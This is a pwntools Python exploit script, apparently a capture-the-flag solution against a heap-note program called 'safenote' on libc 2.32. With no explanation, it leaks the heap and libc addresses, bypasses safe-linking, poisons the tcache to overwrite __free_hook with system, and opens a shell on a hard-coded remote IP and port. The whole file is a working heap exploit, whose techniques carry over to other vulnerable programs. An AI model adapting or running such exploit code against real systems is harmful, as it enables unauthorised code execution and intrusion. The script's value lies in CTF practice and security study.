```python3
#!/usr/bin/python3
from pwn import *
from past.builtins import xrange
from time import sleep
import random
import subprocess

# Util
def add(index,size,data=None):
 global io
 io.sendlineafter('> ','1')
 io.sendlineafter('Index: ',f'{index}')
 io.sendlineafter('Size: ',f'{size}')
 if data is None:
  io.sendafter('Content: ','HK\n')
  return
 io.sendafter('Content: ',data)

def show(index):
 global io
 io.sendlineafter('> ','2')
 io.sendlineafter('Index: ',f'{index}')
 return io.recvline().strip()

def move(index_src,index_dest):
 global io
 io.sendlineafter('> ','3')
 io.sendlineafter('Index (src): ',f'{index_src}')
 io.sendlineafter('Index (dest): ',f'{index_dest}')

def copy(index_src,index_dest):
 global io
 io.sendlineafter('> ','4')
 io.sendlineafter('Index (src): ',f'{index_src}')
 io.sendlineafter('Index (dest): ',f'{index_dest}')

# addr
__free_hook = 0x1e6e40
system = 0x503c0

# exploit
def Pwn():
 global io

 # All about heap-feng-shui

 add(0,0x38) #0
 add(1, 0x38) #1
 add(2, 0x70) #2
 add(3, 0x70,b'A'*0x18 + p64(0x61) + b'\n') #3
 move(0,0)
 heap_base = u64(show(0).ljust(0x8,b'\0')) << 0xc
 print(hex(heap_base))
 add(6,0x18, p64(heap_base >> 0xc ^ (heap_base + 0x310) ) + b'\n')

 move(3,3)
 copy(6,3)
 move(3,3)
 copy(6,3)
 add(5,0x70)
 add(5,0x70,b'A'*0x8 + p64(0xa1) + b'\n')
 for i in xrange(7):
  move(2,2)
  copy(6,2)
 move(2,2)
 add(0,0x70,'\n')
 add(1,0x1,'')
 move(1,1)
 copy(1,0)
 libc_leak = u64(show(0).ljust(8,b'\0'))
 libc_base = libc_leak - (0x1e3c00 + ((heap_base >> 0xc )&0xff)) # Unsorted bin ends with NULL byte in libc-2.32. >_<
 print(hex(libc_base))

 add(1,0x18,p64(0)+b'\n')
 add(4,0x18)
 move(1,1)
 copy(6,1)
 move(1,1)
 copy(6,1)
 move(1,1)
 add(1,0x18,p64(heap_base >> 0xc ^ (libc_base + __free_hook)) + b'\n')
 add(0,0x18,'/bin/sh\0\n')
 add(2,0x18,p64(libc_base + system) + b'\n')
 move(0,1)

if __name__=='__main__':
# io = process('./safenote')
 io = remote('20.48.83.103', 20004)
 Pwn()
 io.interactive()
```
